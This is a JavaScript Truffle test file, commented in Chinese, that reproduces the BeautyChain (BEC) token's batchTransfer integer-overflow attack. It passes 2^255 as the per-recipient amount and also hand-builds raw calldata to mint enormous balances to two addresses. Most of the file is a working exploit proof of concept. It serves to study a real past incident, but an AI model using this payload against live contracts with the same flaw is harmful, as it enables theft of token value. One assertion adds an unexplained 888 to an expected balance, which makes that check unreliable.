var helper = require('../helpers/web3Eth');

const BigNumber = web3.BigNumber

require('chai')
    .use(require('chai-as-promised'))
    .use(require('chai-bignumber')(BigNumber))
    .should()

var BecToken = artifacts.require('BecToken.sol');

// @notice 大数的使用方法

// > web3.toHex(new BigNumber("57896044618658097711785492504343953926634992332820282019728792003956564819968"))
// "0x8000000000000000000000000000000000000000000000000000000000000000"

// 57896044618658097711785492504343953926634992332820282019728792003956564819968
// 0x8000000000000000000000000000000000000000000000000000000000000000
let badNumber = new BigNumber("57896044618658097711785492504343953926634992332820282019728792003956564819968");
console.log(badNumber.toFixed(0))
contract('BecToken', function ([_, owner]) {
    let token;
    let seq = 0;

    beforeEach(async function () {
        token = await BecToken.new({
            from: owner
        });
        seq++;
        console.log(helper.SPACE10, "New contract address:", token.address);
    });

    it('case @ should have correct information', async function () {

        const decimals = await token.decimals();
        const name = await token.name();
        const symbol = await token.symbol();
        const totalSupply = await token.totalSupply();
        decimals.should.be.bignumber.equal(18);
        name.should.equal('BeautyChain');
        totalSupply.should.be.bignumber.equal(7e+27);
    });

    /*
     * @dev 攻击链接：https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f
     */
    
    /// @dev 使用
    it(seq + ' case @ batchTransfer 攻击方法 1)', async function () {
        // console.log(helper.SPACE10, "batchTransfer：", badNumber);
        // token.allEvents(helper.callbackEvent);
        let account0 = "d4de18319360b51beaa28a7af22728bd8181bd91";
        let Str0x = "0x";
        let bec = await token.balanceOf(Str0x + account0);
        assert.equal(bec.valueOf(), 0, "balance of account3 is error.");
        // Error: VM Exception while processing transaction: revert // 0x800......

        await token.batchTransfer([Str0x + account0, Str0x + "d4de18319360b51beaa28a7af22728bd8181bd92"], badNumber, {
            from: owner
        });
        bec = await token.balanceOf(Str0x + account0);
        assert.equal(bec.toFixed(0), badNumber.toFixed(0), "验证batchTransfer操作失败");
    });

    /// @dev 使用
    it(seq + ' case @ batchTransfer 攻击方法 2):', async function () {
        let account0 = "d4de18319360b51beaa28a7af22728bd8181bd91";
        let account1 = "d4de18319360b51beaa28a7af22728bd8181bd92";
        let Str0x = "0x";
        let bec = await token.balanceOf(Str0x + account0);

        assert.equal(bec.valueOf(), 0, "校验攻击前余额失败");

        console.log(helper.SPACE10, 'Owner:', owner);
        console.log(helper.SPACE10, "攻击地址1", Str0x + account0);
        console.log(helper.SPACE10, "攻击地址2", Str0x + account1);

        /// @dev 监听所有合约事件
        // token.allEvents(helper.callbackEvent);

        let data =
            "0x" +
            "83f12fec" +
            "0000000000000000000000000000000000000000000000000000000000000040" +
            "8000000000000000000000000000000000000000000000000000000000000000" +
            "0000000000000000000000000000000000000000000000000000000000000002" +
            "000000000000000000000000" + account0 +
            "000000000000000000000000" + account1;


        let result = await web3.eth.sendTransaction({
            from: owner,
            gasPrice: 1,
            gas:470000,
            to: token.address,
            data: data
        });
        console.log(helper.SPACE10, "result:", result);


        bec = await token.balanceOf(Str0x + account0);
        console.log(helper.SPACE10, "balanceOf(", Str0x + account0, ").toFix(0)", bec.toFixed(0));
        assert.equal(bec.valueOf(), 0x8000000000000000000000000000000000000000000000000000000000000000 + 888, "校验攻击后余额失败1");

        bec = await token.balanceOf(Str0x + account1);
        console.log(helper.SPACE10, "balanceOf(", Str0x + account1, ").toFix(0)", bec.toFixed(0));
        assert.equal(bec.valueOf(), 0x8000000000000000000000000000000000000000000000000000000000000000, "校验攻击后余额失败2");

    });

});
